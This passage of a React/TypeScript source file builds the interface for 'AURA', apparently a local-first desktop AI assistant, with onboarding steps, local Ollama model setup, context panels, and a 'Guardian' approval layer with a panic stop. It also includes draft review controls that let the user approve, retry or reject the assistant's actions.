  async function completeOnboarding() {
    localStorage.setItem('aura:onboarding-complete', '1');
    const metadata = { ...(profileStatus?.metadata || {}), assistant_name: assistantName, onboarding: { completed: true, ...onboardingPrefs, local_model_status: localModelStatus?.summary, selected_model: selectedModelId, voice_enabled: voiceEnabled, voice_command_enabled: voiceCommandEnabled } };
    const usage_limits = onboardingPrefs.monthlyBudget ? { monthly_budget_usd: Number(onboardingPrefs.monthlyBudget) || 0 } : undefined;
    const updated = await updateProfileStatus({ metadata, usage_limits });
    setProfileStatus(updated);
    setOnboardingOpen(false);
    if (voiceEnabled) speak(`Setup saved. Guardian is active. ${assistantName} is ready when AURA Core is connected.`, 'protected');
  }

  async function saveAssistantName() {
    const cleanName = draftAssistantName.trim() || 'AURA';
    setAssistantName(cleanName);
    localStorage.setItem('aura:assistant-name', cleanName);
    setCaption(`Good choice. I'm ${cleanName} now.`);
    setAssistantMode('speaking');
    const metadata = { ...(profileStatus?.metadata || {}), assistant_name: cleanName };
    try {
      const updated = await updateProfileStatus({ metadata });
      setProfileStatus(updated);
    } catch {
      setVoiceStatus('Assistant name saved locally. Backend profile is not connected yet.');
    }
    if (voiceEnabled) speak(`Good choice. I'm ${cleanName} now.`, 'speaking');
  }

  async function approveAndPullLocalModel(modelOverride?: string) {
    const modelToPull = modelOverride || selectedLocalModel;
    if (modelToPull === 'simple') {
      await useExistingOrSkipLocalModel('simple');
      return;
    }
    setModelPullState(`Approval accepted. Pulling ${modelToPull} with Ollama. This may take a while...`);
    const result = await pullLocalModel(modelToPull, true);
    const detail = result.detail || result;
    setModelPullState(detail.ok ? `Pulled and selected ${modelToPull}. Local model is ready for private/simple tasks.` : JSON.stringify(detail, null, 2));
    if (detail.ok) speak(`Local model ${modelToPull} is ready. I will use it for private and simple tasks.`, 'protected');
    await refreshKnowledge();
  }

  async function useExistingOrSkipLocalModel(modelId?: string) {
    const target = modelId || (localModelStatus?.selected_model?.available ? `ollama:${localModelStatus.selected_model.model}` : 'simple');
    const result = await selectModel(target);
    setModelPullState(`Selected ${result.model_id}.`);
    setOnboardingPrefs({ ...onboardingPrefs, localModelSkipped: target === 'simple' });
    await refreshKnowledge();
  }

  function chooseCommand(command: string) {
    setInput(command);
    setCompactCommand(true);
    setTimeout(() => commandRef.current?.focus(), 0);
  }

  async function startAction(card: { title: string; command: string; requires?: string }) {
    setInput(card.command);
    setCompactCommand(true);
    setCaption(`I'm preparing ${card.title.toLowerCase()}.`);
    const context = await captureContextForCommand(card.command);
    if (context === null && requirementForCommand(card.command) !== 'none') return;
    await executeCommand(card.command, {}, false, context);
  }

  function onboardingCopy(step: string) {
    if (step === 'Meet AURA') return { title: `Hello. I'm ${assistantName}.`, body: "I'm your personal AI operating layer. Think of me as your hands on this computer: you tell me what you want done, I plan it, use the right tools, and ask before anything sensitive.", does: 'Introduces the assistant before showing controls.', why: 'The product should feel like meeting an operator, not opening a settings screen.', spoken: `Hello. I'm ${assistantName}. Nice to meet you. I'm your personal AI operating layer. Think of me as your hands on this computer. You tell me what you want done, I plan it, use the right tools, and ask before anything sensitive.` };
    if (step === 'Rename Me') return { title: `${assistantName} is yours to name.`, body: 'Keep the default or choose a name like Alice, Jarvis, or anything that feels natural. The name is saved locally and used across the interface.', does: 'Saves a local assistant identity.', why: 'A personal operating layer should feel personal without requiring a cloud account.', spoken: assistantName === 'AURA' ? `I'm yours. You can rename me. Would you like to give me a name?` : `Good choice. I'm ${assistantName} now.` };
    if (step === 'Privacy + Guardian') return { title: 'Private by default. Protected by Guardian.', body: 'I can write replies, clone repos, build apps, summarize email, use optional workers, remember safe preferences, and learn workflows. I will not send, paste, delete, run dangerous shell commands, spend money, export memory, or push code without approval.', does: 'Combines the privacy, memory, capability, and approval promise into one clear trust step.', why: 'AURA should earn trust quickly instead of forcing a setup tour.', spoken: 'Guardian is my safety layer. I can help operate your computer, but I will ask before sensitive actions and I will not save passwords or secrets.' };
    if (step === 'Workspace') return { title: `Choose where ${assistantName} can work.`, body: 'Use the default local workspace or type a folder you prefer. Clones, coding jobs, and generated files stay contained there.', does: 'Keeps file work inside a user-approved area.', why: 'A real operating layer needs clear boundaries before it touches files.', spoken: 'Choose a workspace or use the default. I will keep computer work contained there.' };
    if (step === 'Local Brain') return { title: 'Local model setup is optional and guided.', body: `${assistantName} detects hardware, Ollama, available models, and recommends a Gemma model only when appropriate. Pulling a model requires approval.`, does: 'Uses local models for private/cheap planning, routing, cleanup, drafts, and summaries.', why: 'Cloud AI should not be required just to start.', spoken: "I'm local-first. For simple and private tasks, I can use a local model on your computer. For heavier work, you can allow Codex, ChatGPT, Claude, or other tools." };
    return { title: 'Start using AURA.', body: 'Use the command box now. Permissions, voice, hotkey, Ollama, Codex, ChatGPT, and Claude can all be configured later. If context is missing, I will say exactly what I need.', does: 'Drops you into the operating layer quickly.', why: 'AURA should start useful, then guide setup only when needed.', spoken: 'Open something and tell me what to do. I will refresh context first, choose the right tool, and ask before sensitive actions.' };
  }

  function renderOnboarding() {
    const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
    const copy = onboardingCopy(step);
    return <div className="persona-stage" aria-label="Meet AURA">
      <div className="persona-background" />
      <aside className="persona-rail" aria-label="Onboarding progress">
        {ONBOARDING_STEPS.map((item, index) => <button key={item} className={index === onboardingStep ? 'step active' : 'step'} onClick={() => setOnboardingStep(index)}><span>{String(index + 1).padStart(2, '0')}</span>{item}</button>)}
      </aside>
      <main className="persona-main">
        <div className="persona-topline">
          <StatusPill label={coreStatus === 'connected' ? 'AURA Core online' : coreStatus === 'starting' ? 'Starting AURA Core...' : 'AURA Core disconnected'} tone={coreStatus === 'connected' ? 'good' : coreStatus === 'starting' ? 'warn' : 'bad'} />
          <StatusPill label="Guardian active" tone="good" />
          <StatusPill label={hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey needs permission'} tone={hotkeyStatus.ok ? 'good' : 'warn'} />
        </div>
        <div className="persona-encounter">
          <AssistantAvatar name={assistantName} mode={assistantMode} />
          <section className="persona-dialogue">
            <div className="eyebrow">First Launch Encounter</div>
            <h1>{copy.title}</h1>
            <p>{copy.body}</p>
            <div className={`caption-card ${assistantMode}`} aria-live="polite">
              <span>{assistantName} says</span>
              <strong>{caption}</strong>
            </div>
            <div className="persona-grid">
              <div className="glass-panel"><span>What I will do</span><p>{copy.does}</p></div>
              <div className="glass-panel"><span>Why it matters</span><p>{copy.why}</p></div>
            </div>
          </section>
        </div>

        <section className="persona-step-panel">
          {step === 'Rename Me' && <div className="rename-panel">
            <label>What should I call myself?<input aria-label="assistant name" value={draftAssistantName} onChange={e => setDraftAssistantName(e.target.value)} placeholder="AURA" /></label>
            <button className="primary-button" onClick={saveAssistantName}>Save name</button>
          </div>}
          {step === 'Privacy + Guardian' && <div className="persona-stack"><BoundaryList /><GuardianPromise /></div>}
          {step === 'Workspace' && <div className="rename-panel">
            <label>Workspace folder<input aria-label="workspace folder" value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder="~/AURA/workspaces" /></label>
            <button className="primary-button" onClick={() => setOnboardingPrefs({ ...onboardingPrefs, workspace: '~/AURA/workspaces' })}>Use default</button>
          </div>}
          {step === 'Local Brain' && <details open className="persona-details"><summary>Local brain and model choice</summary><ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} selectExisting={(modelId) => useExistingOrSkipLocalModel(modelId)} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} /></details>}
          {step === 'Start Using AURA' && <div className="persona-stack"><PermissionCards contextStatus={contextStatus} hotkeyStatus={hotkeyStatus} refreshContext={refreshContext} /><VoiceHotkeyPanel voiceStatus={voiceStatus} voiceEnabled={voiceEnabled} setVoiceEnabled={setVoiceEnabled} voiceCommandEnabled={voiceCommandEnabled} setVoiceCommandEnabled={setVoiceCommandEnabled} isListening={isListening} voiceTranscript={voiceTranscript} voiceUnsupportedReason={voiceUnsupportedReason} speak={speak} pushToTalk={pushToTalk} hotkeyStatus={hotkeyStatus} assistantName={assistantName} /><TestAuraCards startAction={startAction} localReady={localReady} coreOnline={coreStatus === 'connected'} context={capturedContext} assistantName={assistantName} /></div>}
        </section>

        <div className="persona-actions">
          <button onClick={() => setOnboardingStep(Math.max(0, onboardingStep - 1))} disabled={onboardingStep === 0}>Back</button>
          <button onClick={() => speak(copy.spoken || copy.body)}>Speak this step</button>
          <button onClick={() => setOnboardingStep(Math.min(ONBOARDING_STEPS.length - 1, onboardingStep + 1))} disabled={onboardingStep === ONBOARDING_STEPS.length - 1}>Continue</button>
          <button className="primary-button" onClick={completeOnboarding}>Enter command layer</button>
        </div>
      </main>
    </div>;
  }

  if (onboardingOpen) return renderOnboarding();

  return <div className={compactCommand ? 'app-shell operating-layer compact-mode' : 'app-shell operating-layer'}>
    <header className="presence-topbar">
      <div className="brand-row"><span className="brand-mark">{assistantName.slice(0, 1).toUpperCase()}</span><span>{assistantName}</span></div>
      <div className="status-cluster">
        <StatusPill label={coreStatus === 'connected' ? 'AURA Core online' : coreStatus === 'starting' ? 'Starting AURA Core...' : 'AURA Core disconnected'} tone={coreStatus === 'connected' ? 'good' : coreStatus === 'starting' ? 'warn' : 'bad'} />
        <StatusPill label={hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey needs Accessibility'} tone={hotkeyStatus.ok ? 'good' : 'warn'} />
        <StatusPill label={localReady ? `Local: ${selectedModelId || 'ready'}` : 'Local model optional'} tone={localReady ? 'good' : 'warn'} />
        <StatusPill label={`Build ${buildLabel}`} tone="privacy" />
      </div>
    </header>

    <main className="presence-shell">
      <section className="presence-core" aria-label="AURA operating layer">
        <AssistantAvatar name={assistantName} mode={assistantMode} />
        <div className="presence-dialogue">
          <div className="eyebrow">AI operating layer</div>
          <h1>{assistantMode === 'listening' ? "I'm listening." : assistantMode === 'thinking' ? "I'm checking context." : assistantMode === 'acting' ? "I'm operating." : assistantMode === 'blocked' ? 'Guardian blocked that.' : assistantMode === 'error' ? 'I need repair.' : coreStatus === 'connected' ? "I'm online." : "I'm here."}</h1>
          <div className={`caption-card home-caption ${assistantMode}`} aria-live="polite">
            <span>{assistantName} says</span>
            <strong>{caption}</strong>
          </div>
          <div className="command-bar command-bar-large">
            <button className="voice-button" onClick={pushToTalk} title="Push to talk">{isListening ? 'Listening...' : 'Mic'}</button>
            <input ref={commandRef} aria-label="command input" value={input} onFocus={() => setAssistantMode('listening')} onChange={e => { setInput(e.target.value); setAssistantMode(e.target.value.trim() ? 'listening' : 'idle'); }} placeholder={`Tell ${assistantName} what you want done`} onKeyDown={e => { if (e.key === 'Enter') run(); }} />
            <button className="primary-button" aria-label="run command" onClick={() => run()}>Ask</button>
          </div>
          <div className="micro-status">
            <span>{voiceTranscript ? `I heard: ${voiceTranscript}` : 'Wake word is not implemented. Use the mic, hotkey, or type.'}</span>
            <span>{voiceUnsupportedReason || voiceStatus}</span>
            <span>{hotkeyStatus.ok ? `${hotkeyStatus.accelerator} opens command mode and refreshes context.` : `Hotkey setup: ${hotkeyStatus.error || 'enable AURA/Electron in macOS Accessibility, then relaunch.'}`}</span>
          </div>
        </div>
      </section>

      {coreStatus !== 'connected' && <div role="alert" className="repair-banner">
        <strong>{coreMessage}</strong>
        <span>{coreError || `Cannot reach ${BACKEND_URL}. In packaged builds this often means backend Python dependencies such as uvicorn are missing.`}</span>
        <button onClick={repairBackend}>Repair Backend</button>
        <button onClick={async () => { await refreshConnection(); await refreshKnowledge(); await refreshDiagnostics(); }}>Retry</button>
        <button onClick={async () => setLogsPath(window.auraDesktop?.openLogs ? await window.auraDesktop.openLogs() : 'No desktop bridge. Start from Electron for logs.')}>Open logs</button>
        {repairState && <span className="helper-text">{repairState}</span>}
      </div>}

      {needsUser && <div role="alert" className="approval-banner">
        <strong>{pendingApproval ? 'Guardian needs approval' : `${assistantName} needs context`}</strong>
        <span>{pendingApproval ? (toolApproval ? `Approve ${approvalState.step_name || approvalState.action_type || 'this action'}` : 'Review the draft, edit if needed, then approve paste-back.') : needsUser}{pendingRisk ? ` (${pendingRisk})` : ''}</span>
        {!pendingApproval && <button onClick={async () => { const r = await resumeRun(runId); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }}>Continue</button>}
      </div>}

      <section className="operating-grid">
        <article className="glass-panel context-panel">
          <PanelTitle eyebrow={`${assistantName} sees`} title={capturedContext?.active_app || 'No app context yet'} />
          <div className="context-lines">
            <div><span>Window</span>{capturedContext?.window_title || '-'}</div>
            <div><span>URL</span>{shortText(currentUrl || capturedContext?.browser_url, 'No browser URL yet')}</div>
            <div><span>Workspace</span>{capturedContext?.workspace_hint || capturedContext?.project?.current_folder || '-'}</div>
            <div><span>Selection</span>{shortText(capturedContext?.input_text, 'No selected text captured')}</div>
          </div>
          <div className="panel-actions">
            <button onClick={refreshContext}>Refresh context</button>
            <button onClick={() => { setOnboardingStep(5); setOnboardingOpen(true); }}>Permission help</button>
          </div>
          <p className="helper-text">{contextStatus}</p>
        </article>

        <article className="glass-panel stream-panel">
          <PanelTitle eyebrow="Action stream" title={events.length || needsUser || pendingApproval ? `${assistantName} is operating` : 'Ready for intent'} />
          <Feed items={streamItems} />
        </article>

        <article className="glass-panel guardian-card">
          <PanelTitle eyebrow="AURA Guardian" title={pendingApproval ? 'Approval required' : 'Protected'} />
          <div className="guardian-core">{pendingApproval ? 'Approval required' : 'Protected'}</div>
          <p>Guardian blocks destructive actions, watches for secrets, redacts sensitive data, and pauses paste/send, shell/file, memory export, and paid actions.</p>
          <div className="guardian-grid">
            <span>Watching for secrets</span>
            <span>Shell/file risk policy active</span>
            <span>Paste/send approval active</span>
            <span>Local-first mode active</span>
          </div>
          <button className="danger-button" onClick={() => panicStop(runId)} disabled={!runId}>Panic Stop</button>
        </article>

        <article className="glass-panel action-panel">
          <PanelTitle eyebrow="What I can do now" title={contextKind(capturedContext) === 'none' ? 'Open context or ask directly' : 'Context-aware actions'} />
          <ContextActionCards cards={contextActions} startAction={startAction} coreOnline={coreStatus === 'connected'} contextKindValue={contextKind(capturedContext)} assistantName={assistantName} />
        </article>
      </section>

      <section className="secondary-intelligence">
        <details className="glass-panel">
          <summary>Memory, workflows, and model status</summary>
          <div className="two-column">
            <div><PanelTitle eyebrow="Memory intelligence" title={memoryFeed.length ? 'Useful learning' : 'No memory updates yet'} /><Feed items={memoryFeed.length ? memoryFeed : [{ kind: 'empty', title: 'No memory updates yet', detail: 'AURA will show useful learning here after real tasks.' }]} /><button onClick={async () => { const r = await compactMemory('personal'); setOut(JSON.stringify(r, null, 2)); await refreshKnowledge(); }}>Compact personal memory</button></div>
            <div><PanelTitle eyebrow="Work handled" title={`${conservativeMinutesSaved} min estimated`} /><div className="metric-grid"><Metric label="Runs" value={events.length || 0} /><Metric label="Approvals" value={approvalsHandled} /><Metric label="Workflows" value={workflowsReplayed} /><Metric label="Blocked" value={blockedCount} /></div><p className="helper-text">Conservative estimate from completed run events, replayed workflows, and useful memory signals.</p></div>
          </div>
          <ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} selectExisting={(modelId) => useExistingOrSkipLocalModel(modelId)} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} />
        </details>
      </section>

      {(pendingApproval || draftText || runId) && <section className="approval-workspace">
        <DraftReview runId={runId} pendingApproval={pendingApproval} toolApproval={toolApproval} approvalState={approvalState} generation={generation} pasteState={pasteState} draftText={draftText} setDraftText={setDraftText} feedback={feedback} setFeedback={setFeedback} approve={async () => { const r = await approveRun(runId, draftText); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} retry={async () => { const r = await retryRun(runId, feedback); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} reject={async () => { const r = await rejectRun(runId, feedback); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} />
      </section>}

      <section className="advanced-toggle">
        <button onClick={() => setAdvancedOpen(!advancedOpen)}>{advancedOpen ? 'Hide Advanced' : 'Advanced / Diagnostics'}</button>
      </section>

      {advancedOpen && <section className="panel-body advanced-diagnostics">
        <details className="glass-panel" open><summary>Diagnostics / Freshness</summary><p>Build ID: {buildLabel}</p><p>Backend URL: {BACKEND_URL}</p><p>Installed app path: {diagnostics?.installedAppPath || '-'}</p><p>Profile path: {diagnostics?.profilePath || '~/.aura'}</p><p>App data path: {diagnostics?.userDataPath || '-'}</p><p>Logs: {logsPath || diagnostics?.logsPath || '-'}</p><p>Backend command: {diagnostics?.backend?.command || '-'}</p><p>Reset app state: run `scripts/reset-aura-local.sh` from the repo root. It asks first and archives local state by default.</p><button onClick={refreshDiagnostics}>Refresh diagnostics</button><button onClick={async () => setLogsPath(window.auraDesktop?.openLogs ? await window.auraDesktop.openLogs() : 'No desktop bridge.')}>Open logs folder</button></details>
        <details className="glass-panel"><summary>Raw run timeline</summary><ActionPanel events={events} /></details>
        <details className="glass-panel"><summary>Raw context JSON</summary><pre>{JSON.stringify(capturedContext, null, 2)}</pre></details>
        <details className="glass-panel"><summary>System, model, and backend internals</summary><p>Backend: {BACKEND_URL} / {coreStatus} / Flow: {launchFlow} / Session: {sessionState}</p><pre>{JSON.stringify({ diagnostics, profileStatus, costSummary, costModels, tools, devices, sessions, storage, workflows, workflowSuggestions, out }, null, 2)}</pre></details>
      </section>}
    </main>

    <footer className="footer-line">AURA Core: {coreStatus}. Guardian: protected. Wake word: not implemented. Build: {buildLabel}.</footer>
  </div>;
}

function StatusPill(props: { label: string; tone: string }) {
  return <span className={`status-pill ${props.tone}`}>{props.label}</span>;
}

function AssistantAvatar(props: { name: string; mode: string; compact?: boolean }) {
  return <div className={props.compact ? `assistant-avatar compact ${props.mode}` : `assistant-avatar ${props.mode}`} aria-label={`${props.name} avatar`}>
    <div className="avatar-halo" />
    <div className="avatar-core">
      <span className="core-ring ring-one" />
      <span className="core-ring ring-two" />
      <span className="core-ring ring-three" />
      <span className="core-pulse" />
      <span className="core-scan" />
      <span className="core-particle p1" />
      <span className="core-particle p2" />
      <span className="core-particle p3" />
      <span className="core-particle p4" />
    </div>
    <div className="avatar-name">{props.name}</div>
  </div>;
}

function BoundaryList() {
  const items = ['Send email', 'Paste into apps', 'Delete or overwrite files', 'Run dangerous shell commands', 'Spend money', 'Export/import memory', 'Replay risky workflows', 'Push code'];
  return <div className="boundary-grid">{items.map((item) => <div className="boundary-item" key={item}><strong>{item}</strong><span>Approval required</span></div>)}</div>;
}

function GuardianPromise() {
  return <div className="guardian-promise">
    <div className="guardian-core">Protected</div>
    <div className="guardian-grid">
      <span>Blocked by default for destructive actions</span>
      <span>Watching for secrets</span>
      <span>Explains why approval is needed</span>
      <span>Redacts logs, timeline, and memory</span>
      <span>Paste/send policy active</span>
      <span>Panic stop supported</span>
    </div>
  </div>;
}

function PermissionCards(props: { contextStatus: string; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; refreshContext: () => void }) {
  const permissions = [
    { name: 'Accessibility', use: 'Bring AURA forward, capture app context, and control apps when approved.', never: 'Never controls apps silently.', status: props.hotkeyStatus.ok ? 'Likely enabled' : 'May be needed for hotkey/control' },
    { name: 'Automation', use: 'macOS may ask before AURA interacts with another app.', never: 'Never sends, pastes, or clicks through approval gates.', status: 'Requested per app by macOS' },
    { name: 'Microphone', use: 'Push-to-talk permission check and future voice input.', never: 'No always-listening wake word in this build.', status: 'Optional' },
    { name: 'Screen Recording', use: 'Visual context only when needed.', never: 'Never stores screenshots as memory without permission.', status: 'Optional until visual context is enabled' },
    { name: 'Browser handoff', use: 'Prepare ChatGPT/Claude prompts or read current URL when available.', never: 'Never claims page context it cannot see.', status: 'Optional' },
  ];
  return <div className="permission-grid">{permissions.map((permission) => <article className="permission-card" key={permission.name}>
    <span>{permission.status}</span>
    <h3>{permission.name}</h3>
    <p><strong>Why:</strong> {permission.use}</p>
    <p><strong>Never:</strong> {permission.never}</p>
  </article>)}<button onClick={props.refreshContext}>Check permissions / refresh context</button><p className="helper-text">{props.contextStatus}</p></div>;
}

function PanelTitle(props: { eyebrow: string; title: string }) {
  return <div className="panel-title"><span>{props.eyebrow}</span><h2>{props.title}</h2></div>;
}

function Metric(props: { label: string; value: any }) {
  return <div className="metric"><strong>{props.value}</strong><span>{props.label}</span></div>;
}

function Feed(props: { items: Array<{ kind?: string; title: string; detail?: string }> }) {
  return <div className="feed-list">{props.items.map((item, index) => <div className={`feed-item ${item.kind || ''}`} key={`${item.title}-${index}`}><div className="feed-dot" /><div><strong>{item.title}</strong><p>{item.detail}</p></div></div>)}</div>;
}

function ContextActionCards(props: { cards: Array<any>; startAction: (card: any) => void; coreOnline: boolean; contextKindValue: string; assistantName: string }) {
  return <div className="context-action-grid">{props.cards.map((card) => <article className="context-action-card" key={card.title}>
    <span>{props.coreOnline ? card.readiness : 'AURA Core must connect first'}</span>
    <h3>{card.title}</h3>
    <p>{card.detail}</p>
    {card.requires !== 'none' && props.contextKindValue !== card.requires && <p className="helper-text">{missingContextMessage(card.requires, props.assistantName)}</p>}
    <button onClick={() => props.startAction(card)}>{card.requires !== 'none' && props.contextKindValue !== card.requires ? 'Show setup needed' : 'Start'}</button>
  </article>)}</div>;
}

function ModelStatusPanel(props: { localModelStatus: any; modelError: string; selectedLocalModel: string; setSelected: (value: string) => void; approveAndPullLocalModel: (model?: string) => void; selectExisting: (modelId: string) => void; skip: () => void; refresh: () => void; modelPullState: string }) {
  const hw = props.localModelStatus?.hardware || {};
  const ollama = props.localModelStatus?.ollama || {};
  const recommendation = props.localModelStatus?.recommendation || {};
  const choices = asArray(recommendation.choices);
  const selectedModelId = props.localModelStatus?.selected_model?.id || 'simple';
  const selectedModel = props.localModelStatus?.selected_model?.model || 'simple';
  const availableModels = asArray(props.localModelStatus?.available_models);
  return <div className="model-grid">
    {props.modelError && <div className="callout bad">{props.modelError}</div>}
    <div className="glass-panel"><span>OS</span><strong>{hw.os || 'Unknown'}{hw.macos_version ? ` ${hw.macos_version}` : ''}</strong></div>
    <div className="glass-panel"><span>Chip</span><strong>{hw.apple_silicon ? 'Apple Silicon' : hw.arch === 'x64' ? 'Intel' : hw.arch || 'Unknown'}</strong></div>
    <div className="glass-panel"><span>RAM</span><strong>{hw.ram_gb ? `${hw.ram_gb} GB` : 'Unknown'}</strong></div>
    <div className="glass-panel"><span>Ollama</span><strong>{ollama.installed ? 'Installed' : 'Missing'} / {ollama.running ? 'Running' : 'Stopped'}</strong></div>
    <div className="glass-panel wide">
      <span>Recommended local model</span>
      <strong>{recommendation.recommended_pull || recommendation.model || props.selectedLocalModel}</strong>
      <p>{recommendation.reason || 'AURA recommends a small private model until hardware detection completes.'}</p>
      <p className="helper-text">Used for private/simple tasks, memory cleanup, routing, summaries, and draft fallback. Codex remains the coding worker.</p>
    </div>
    <div className="glass-panel wide">
      <span>Local model status</span>
      <strong>{props.localModelStatus?.summary || 'Checking local model runtime...'}</strong>
      <p>Provider: {selectedModelId === 'simple' ? 'SimpleLLM fallback' : 'Ollama'} / Model: {selectedModel}</p>
      <p>Available local models: {availableModels.length ? availableModels.join(', ') : 'None detected yet'}</p>
      <div className="panel-actions"><button onClick={props.refresh}>Retry detection</button><button onClick={props.skip}>Skip local model</button>{!ollama.installed && <a className="button-link" href={ollama.install_url || 'https://ollama.com/download'} target="_blank" rel="noreferrer">Install Ollama</a>}</div>
      {ollama.installed && !ollama.running && <p className="helper-text">Ollama is installed but stopped. Start the Ollama app, or run `ollama serve`, then retry detection.</p>}
    </div>
    <div className="glass-panel wide">
      <span>Choose model size</span>
      <div className="model-choice-grid">
        {(choices.length ? choices : [{ id: recommendation.recommended_pull || props.selectedLocalModel, model: recommendation.recommended_pull || props.selectedLocalModel, label: 'Recommended Gemma local model', role: recommendation.role || 'private/simple tasks', installed: false, available_for_hardware: true, recommended: true, status: 'recommended' }, { id: 'simple', model: 'simple', label: 'Skip local model for now', role: 'deterministic fallback until Ollama is configured', installed: true, available_for_hardware: true, recommended: false, status: 'fallback' }]).map((choice: any) => {
          const model = choice.model || choice.id;
          const selected = props.selectedLocalModel === model || selectedModelId === `ollama:${model}` || selectedModelId === model;
          const canPull = choice.id !== 'simple' && ollama.installed && choice.available_for_hardware;
          const canSelect = choice.id === 'simple' || choice.installed;
          return <article className={choice.recommended ? 'model-choice recommended' : 'model-choice'} key={choice.id || model}>
            <span>{choice.recommended ? 'Recommended' : choice.status}</span>
            <h3>{choice.label || model}</h3>
            <p>{model}</p>
            <p>{choice.role}</p>
            <p className="helper-text">RAM: {choice.min_ram_gb || 0} GB+ / {choice.installed ? 'installed' : choice.available_for_hardware ? 'download needed' : 'too large for detected RAM'}</p>
            <div className="panel-actions">
              <button onClick={() => props.setSelected(model)} disabled={choice.id === 'simple'}>{selected ? 'Selected' : 'Choose'}</button>
              {canSelect && <button onClick={() => props.selectExisting(choice.id === 'simple' ? 'simple' : `ollama:${model}`)}>{choice.id === 'simple' ? 'Use fallback' : 'Use installed'}</button>}
              {!choice.installed && choice.id !== 'simple' && <button onClick={() => { props.setSelected(model); props.approveAndPullLocalModel(model); }} disabled={!canPull}>Approve download</button>}
            </div>
          </article>;
        })}
      </div>
      {props.modelPullState && <pre>{props.modelPullState}</pre>}
    </div>
  </div>;
}

function VoiceHotkeyPanel(props: { voiceStatus: string; voiceEnabled: boolean; setVoiceEnabled: (value: boolean) => void; voiceCommandEnabled: boolean; setVoiceCommandEnabled: (value: boolean) => void; isListening: boolean; voiceTranscript: string; voiceUnsupportedReason: string; speak: (text: string) => void; pushToTalk: () => void; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; assistantName: string }) {
  return <div className="voice-grid">
    <div className="glass-panel"><span>Hotkey Setup</span><strong>{props.hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey unavailable'}</strong><p>{props.hotkeyStatus.ok ? `${props.hotkeyStatus.accelerator} brings AURA forward, focuses command input, captures context, and can start listening if enabled below.` : `Hotkey unavailable - ${props.hotkeyStatus.error || 'enable Accessibility permission for AURA/Electron in System Settings, then relaunch AURA.'}`}</p><button onClick={props.pushToTalk}>Test voice button</button><p className="helper-text">macOS path: System Settings to Privacy & Security to Accessibility, then enable AURA or Electron.</p></div>
    <div className="glass-panel"><span>Voice output</span><strong>{props.voiceEnabled ? 'Enabled' : 'Optional'}</strong><label><input type="checkbox" checked={props.voiceEnabled} onChange={e => props.setVoiceEnabled(e.target.checked)} /> Speak guidance and status</label><button onClick={() => props.speak(`I'm ${props.assistantName}. I help you use your computer safely. Guardian is active.`)}>Speak intro</button></div>
    <div className="glass-panel"><span>Voice input</span><strong>{props.isListening ? 'Listening now' : 'Push-to-talk command mode'}</strong><p>{props.voiceStatus}</p><label><input type="checkbox" checked={props.voiceCommandEnabled} onChange={e => props.setVoiceCommandEnabled(e.target.checked)} /> Start listening when hotkey opens AURA</label><button onClick={props.pushToTalk}>{props.isListening ? 'Stop listening' : 'Press and speak'}</button><p className="helper-text">Wake word is coming soon. For now, press the mic or hotkey and speak.</p>{props.voiceTranscript && <p className="transcript-pill">Transcript: {props.voiceTranscript}</p>}{props.voiceUnsupportedReason && <p className="helper-text">{props.voiceUnsupportedReason}</p>}</div>
    <div className="glass-panel"><span>Always-on mode</span><strong>Coming later</strong><p>For now, start AURA when your Mac starts and use the hotkey or voice button.</p></div>
  </div>;
}

function TestAuraCards(props: { startAction: (card: any) => void; localReady: boolean; coreOnline: boolean; context: any; assistantName: string }) {
  const kind = contextKind(props.context);
  return <div className="launch-grid">{FIRST_USER_TESTS.map((card) => {
    const missing = card.requires === 'github' && kind !== 'github'
      ? missingContextMessage('github', props.assistantName)
      : card.requires === 'email' && kind !== 'email'
        ? missingContextMessage('email', props.assistantName)
        : '';
    return <article className="launch-card" key={card.title}><span>{props.coreOnline ? (missing || 'Ready') : 'Core must connect first'}</span><h3>{card.title}</h3><p><strong>Setup:</strong> {card.setup}</p><p><strong>Expected:</strong> {card.expected}</p><p><strong>Local model:</strong> {props.localReady ? 'ready' : 'optional / fallback'}</p><button onClick={() => props.startAction(card)}>{missing ? 'Show setup needed' : 'Start'}</button></article>;
  })}</div>;
}

function DraftReview(props: any) {
  return <div className="glass-panel draft-panel">
    <PanelTitle eyebrow="AURA is thinking" title={props.pendingApproval ? 'Approval required' : 'Draft review'} />
    <div className="context-lines">
      <div><span>Approval</span>{props.approvalState.status || 'not requested'}</div>
      <div><span>Generation</span>{props.generation.provider ? `${props.generation.provider}${props.generation.model ? ` / ${props.generation.model}` : ''}` : '-'}</div>
      <div><span>Paste validation</span>{props.pasteState.target_validation_result || props.pasteState.target_validation || '-'}</div>
    </div>
    {!props.toolApproval && <textarea aria-label="draft editor" value={props.draftText} onChange={(e) => props.setDraftText(e.target.value)} rows={7} placeholder="Generated draft will appear here." />}
    {props.toolApproval && <pre>{JSON.stringify(props.approvalState.requested_args || {}, null, 2)}</pre>}
    <input aria-label="retry feedback" value={props.feedback} onChange={(e) => props.setFeedback(e.target.value)} placeholder="Optional retry feedback" />
    <div className="panel-actions"><button disabled={!props.runId || !props.pendingApproval} onClick={props.approve}>{props.toolApproval ? 'Approve Action' : 'Approve & Paste'}</button><button disabled={!props.runId || !props.pendingApproval || props.toolApproval} onClick={props.retry}>Retry</button><button disabled={!props.runId || !props.pendingApproval} onClick={props.reject}>Reject</button></div>
  </div>;
}

